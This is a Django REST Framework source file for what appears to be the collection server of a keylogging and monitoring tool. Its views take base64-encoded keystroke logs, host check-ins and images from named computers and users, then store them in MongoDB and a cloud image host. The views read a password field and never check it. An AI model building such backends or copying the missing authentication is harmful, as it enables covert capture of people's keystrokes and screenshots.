#from django.contrib.auth.models import User, Group
#from rest_framework import viewsets
#from restapi.serializers import UserSerializer, GroupSerializer


#class UserViewSet(viewsets.ModelViewSet):
    
    #queryset = User.objects.all().order_by('-date_joined')
    #serializer_class = UserSerializer


#class GroupViewSet(viewsets.ModelViewSet):
    
    #queryset = Group.objects.all()
    #serializer_class = GroupSerializer


from rest_framework_mongoengine import viewsets, generics
from restapi.serializers import *
from django.conf import settings
from datetime import datetime
from rest_framework import mixins, status
from rest_framework.parsers import JSONParser, FormParser
from rest_framework.response import Response
from django.http import HttpResponse
from restapi.operations import *
from restapi.error_handler import *
from restapi.cloudinary_handler import *
import json

class ToolViewSet(viewsets.ModelViewSet):
    '''
    Contains information about inputs/outputs of a single program
    that may be used in Universe workflows.
    '''
    lookup_field = 'id'
    serializer_class = ToolSerializer

    def get_queryset(self):
        result = settings.MONGO_DB.test_data.find({})
        return result
    
    
class DataInsert(viewsets.ModelViewSet): 
    """
    This viewset automatically provides `list`, `create`, `retrieve`,
    `update` and `destroy` actions.
    """
    def get_serializer_class(self):
        """if self.action == 'list':
            return ToolSerializer"""
        if self.action == 'create':
            return InsertSerializer
        return serializers.Default # I dont' know what you want for create/destroy/update
    
    """def get_queryset(self):
        result = settings.MONGO_DB.test_data.find({})
        return result"""
    
    def create(self, request):
        #self.request
        if request.method == 'POST':
            fw_user = request.POST.get("user", "")
            fw_password = request.POST.get("password", "")
            
            logTime = request.POST.get("com_time", "")
            comName = request.POST.get("com_name", "")
            comUser = request.POST.get("com_user", "")
            keylogData = request.POST.get("keylog_data", "")
            keylogDataDC = ""
            packetsArray = []
            tagsData = {}
            allPacketsData = {}
            isoDate = datetime.strptime(logTime, "%d.%m.%Y %H:%M:%S")
            try:
                if(len(keylogData) > 0):
                    keylogDataDC = Decrypt_B64(keylogData)
                else:
                    keylogDataDC = "";

                allPacketsData = Convert_To_Packets_Data(fw_user, comName, comUser, keylogDataDC)
                tagsData = allPacketsData["tags_data"]
                packetsArray = allPacketsData["packets_data"]
                #get tag counts


                result = settings.MONGO_DB.raw_data_col.insert_one(
                    {
                        "username":fw_user,
                        "computer_name": comName,
                        "logged_user":comUser,
                        "decrypted_data":keylogDataDC,
                        "log_time":isoDate, #should we do server time?
                    }
                )

                result = settings.MONGO_DB.all_packets_data.insert(packetsArray) #insert an array of documents
                result = settings.MONGO_DB.tags_counter.insert({
                    "username":fw_user,
                    "computer_name":comName,
                    "tags_data":json.loads(tagsData),
                    "log_time":isoDate,
                })
                
            except Exception as e:
                #error reporting
                Report_Error("Keylog Data Error", str(e), keylogData, isoDate)
                return HttpResponse(status=500)
            #return Response({'response':'OK'}, status=status.HTTP_201_CREATED)
            return HttpResponse(status=201)
        else:
            return HttpResponse(status=404)
        
        
class HostLogInsert(viewsets.ModelViewSet): 
    def get_serializer_class(self):
        if self.action == 'create':
            return InsertSerializer
        return serializers.Default # I dont' know what you want for create/destroy/update
    
    def create(self, request):
        #self.request
        if request.method == 'POST':
            #authenticate user
            fw_user = request.POST.get("user", "")
            fw_password = request.POST.get("password", "")
            
            logTime = request.POST.get("com_time", "")
            comName = request.POST.get("com_name", "")
            comUser = request.POST.get("com_user", "")
            try:
                result = settings.MONGO_DB.host_log.insert_one(
                    {
                        "username":fw_user,
                        "computer_name": comName,
                        "logged_user":comUser,
                        "log_time":datetime.strptime(logTime, "%d.%m.%Y %H:%M:%S"), #should we do server time?
                    }
                )
            except Exception as e:
                #error reporting
                Report_Error("Host Log Error", str(e), "Encountered an Unknown Error while processing Host Log Entry. com_name: " + comName + ", log_time: " + logTime + ", fw_user: " + fw_user + ".", datetime.strptime(logTime, "%d.%m.%Y %H:%M:%S"))
                return HttpResponse(status=500)
            #return Response({'response':'OK'}, status=status.HTTP_201_CREATED)
            return HttpResponse(status=201)
        else:
            return HttpResponse(status=404)
        
        
class PhotoInsert(viewsets.ModelViewSet): 
    def get_serializer_class(self):
        if self.action == 'create':
            return InsertSerializer
        return serializers.Default # I dont' know what you want for create/destroy/update
    
    def create(self, request):
        #self.request
        if request.method == 'POST':
            #authenticate user
            fw_user = request.POST.get("user", "")
            fw_password = request.POST.get("password", "")
            
            imageData = request.POST.get("image_data", "")
            logTime = request.POST.get("com_time", "")
            comName = request.POST.get("com_name", "")
            comUser = request.POST.get("com_user", "")
            try:
                imageUploadResults = UploadImage(imageData, fw_user, comName, comUser) #insert data into the table
                result = settings.MONGO_DB.image_col.insert_one(
                    {
                        "username":fw_user,
                        "computer_name": comName,
                        "logged_user":comUser,
                        "log_time":datetime.strptime(logTime, "%d.%m.%Y %H:%M:%S"), #should we do server time?
                        "image_secure_url":imageUploadResults["secure_url"],
                    }
                )
            except Exception as e:
                #error reporting
                Report_Error("Host Log Error", str(e), "Encountered error while trying to parse image: " + imageData, datetime.now()
)
                return HttpResponse(status=500)
            #return Response({'response':'OK'}, status=status.HTTP_201_CREATED)
            return HttpResponse(status=201)
        else:
            return HttpResponse(status=404)